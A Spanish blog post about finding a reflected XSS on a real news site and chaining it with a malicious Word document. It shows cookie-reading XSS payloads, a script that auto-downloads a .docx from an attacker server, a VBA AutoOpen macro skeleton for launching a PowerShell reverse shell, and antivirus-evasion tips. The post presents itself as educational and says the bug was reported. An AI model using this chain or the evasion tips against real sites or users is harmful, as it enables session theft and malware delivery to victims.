---
layout: post
title: Simple XSS reflejado en un sitio web real
author: c4rta
date: 2023-06-28
##categories: [Maquinas, HackTheBox]
image: /assets/img/simple_xss/waifu.jpg
tags: [XSS]
---
Te voy a enseñar como encontre una vulnerabilidad XSS reflejado en un sitio web real

{:.lead}

**Este no es ningun writeup, pero te voy a mostrar como encontre de casualidad una vulnerabilidad ```XSS reflejado``` en un sitio web real, cabe recalcar que la vulnerabilidad ya la reporte, y no estoy promoviendo explotar vulnerabilidades en entornos reales, y simplemente te voy a dar la idea de algo que podria hacer alguien con malas intenciones, que este no es el caso, y espero que el tuyo tampoco**

## XSS reflejado

De acuerdo a port swigger se trata de:

> Surge cuando una aplicación recibe datos en una solicitud HTTP e incluye esos datos en la respuesta inmediata de forma no segura

Es decir que en un XSS reflejado los datos que mándamos por una petición HTTP se reflejan en la respuesta que da el servidor web hacia el cliente (navegador)

Cómo dice OWASP:

> El ataque se lleva a cabo a través de un único ciclo de solicitud/respuesta.

En este tipo de XSS el codigo no reside en la aplicacion web como tal y no se encuentra del lado del servidor, y regularmente un atacante puede incrustar su payload malicioso en la URL generada y enviarselo a la victima, obvio se usa ingenieria social y phishing para que sea mas creible.

## Identificando el XSS

> Evidentemente voy se censurar la URL

**¿Como me di cuenta que era un XSS?**

Fue muy random, originalmente yo solo queria buscar una noticia, entonces use su barra de busqueda para encontrar lo que queria, cuando busque por un termino me di cuenta de la forma tan peculiar de la URL y como se mostraban los datos en la pagina, mira:

![](/assets/img/simple_xss/1.png)

Vean como cuando se realiza una busqueda, te manda a la ruta ```/buscar/``` la cual tiene un parametro de consulta el cual es la ```q```, como se ve en ```?q=c4rta```, asi que el parametro ```q``` es utilizado para especificar el termino que se quiere buscar, y del lado de la pagina web, el termino que busque se refleja en la pagina web

![](/assets/img/simple_xss/2.png)

Esto ya estaba curioso, asi que decidi mostrar el codigo fuente de la pagina cuando se realiza la busqueda, y por suerte encontre la funcion que realiza la busqueda

![](/assets/img/simple_xss/3_000.png)

Primero con:

```js
var searchString = document.getElementById('searchtextsimple').value;
```
Lo que esta haciendo es crear una variable llamada ```searchString``` la cual va a contener el valor del atributo ```value``` del elemento con el id ```searchtextsimple```, y ese elemento con el id es este:

```html
<input id="searchtextsimple" type="text" name="q" class="form-control" placeholder="Buscar" value="c4rta"></input>
```

Despues en el JS tenemos que nuestro input el cual esta guardado en ```searchString``` se le concatena sin ningun tipo de procesamiento ni sanitizacion a la URL a tra vez del parametro ```q```:

```js
var url = "https://<URL>/barebone/wf.template/config.default.master.withgroupcount?q=" + encodeURI(searchString);
```

Y por ultimo carga la URL para mostrarla en la web:

```js
$(".results-group.parent").load(url);
```

Entonces tenemos que nuestro input se guarda en al atributo ```value``` de  la etiqueta ```<input>``` y despues se extrae y se concatena directamente en la URL para luego ser interpretado por el sitio web, la vulnerabilidad es obvia, al yo tener control total de lo que quiero buscar y este sera interpretado, entonces puedo probar por XSS a ver si interpreta codigo de JS, ahora le ingresare esto como input:

```js
<script>alert("Prueba XSS")</script>
```

Y vean como si nos interpreta el JS y ya nos dimos cuenta que tenemos un XSS reflejado

![](/assets/img/simple_xss/4.png)

Y en la URL se incrusto el codigo de XSS

![](/assets/img/simple_xss/5.png)

Podria usar otro payload para obtener las cookies, y curiosamente este sitio web tiene un monton

```js
<script>alert(document.cookie)</script>
```
<center><img src="/assets/img/simple_xss/6.png" width=290px height=200px></center><br>

Evidentemente censure todo por que sale mi cookie de sesion asi como otras muchas, y es posible que hayas pensado que este XSS una vez teniendo la cookie de sesion podria conducir a un CSRF/XSRF, y es correcto mientras sea vulnerable a ello. pero este vez vamos a ir mas alla, por que este XSS lo vamos combinar con malware, mas en concreto algo que se le conoce como ```MalDoc```

## MalDoc

MalDoc viene de Malicious Document, y lo que podria hacer ahora es crear una macro en VBS la cual vamos a incrustar en un docx, donde la macro se ejecutara automaticamente al abrirse el documento, y vamos a aprovechar el XSS para crear un payload que al entrar a la URL vulnerable a XSS, se descargue automaticamente el documento de una URL creada por el atacante, el payload es el siguiente:

```js
<script> 
    var link = document.createElement('a');
    link.href = 'URL:8080/MalDoc.docx';
    link.download = 'MalDoc.docx';
    link.click();
</script>
```

Basicamente el escenario seria que nosotros como atacantes le mandemos a la victima la URL del sitio vulnerable con el payload, la victima abra la URL, se descargue automaticamente el docx, se redireccione al sitio original de la pagina vulnerable, la victima abra el documento que contiene una macro, la macro se ejecute y ejecuta un comando que podria ser una reverse shell

Esto pasaria si la victima abre el link con el payload:

![](/assets/img/simple_xss/7.png)

Vean como la URL tiene el payload, y el entrar al link, se descargar automaticamente el documento del sitio web del atacante, en este caso, es un servidor web que cree con python y que tiene mi IPv4.

Y entonces al abrirlo se deberia de ejecutar la macro con la reverse shell, pero ¿Como se crea la macro?, bueno, el msfvenom ya tiene modulos para crear un MalDoc y una macro maliciosa, pero estamos aprendiendo, hay que hacerlo manual, simplemente de voy a dar la idea, no lo voy a poner a prueba.

Podriamos crear un archivo VBS de esta manera:

```vb
Sub AutoOpen()
Comando_Ps = "el tipico oneliner de powershell"

Dim Shell As Object
Set Shell = CreateObject("Wscript.Shell")
Shell.Run (Comando_Ps)

End Sub
```

Basicamente lo que va a hacer es ejecutar un comando de powershell que se declare en la variable ```Comando_Ps``` a tra vez de un objeto ```Wscript.Shell```

Y ahora para incrustarla en el docuemento se puede hacer uso de ```Microsoft Visual Basic for Applications``` y guardar el documento con la macro.

Y seguramente diras: "Eso no evade ningun antivirus, y el defender lo va a detectar", y en efecto, asi que te dare unos tips

- Usa Invoke-Obfuscation
- Usa procesos VMI
- Usa StrRerverse() para agregar un poco mas de ofuscacion
- Usa WMI Win32_PingStatus para evadir sandboxes

(Estas tecnicas que acabe de mencionar, como lo de MalDoc con la macro y las tecnicas para evadir antivirus pienso dedicarles un post aparte)

> Recuerda que la vulnerabilidad ya esta reportada, y no estoy promoviendo la creacion de malware ni tampoco el explotar vulnerabilidades sin el permisos de otros, es meramente educativo e informativo.

Eso ha sido todo, gracias por leer ❤
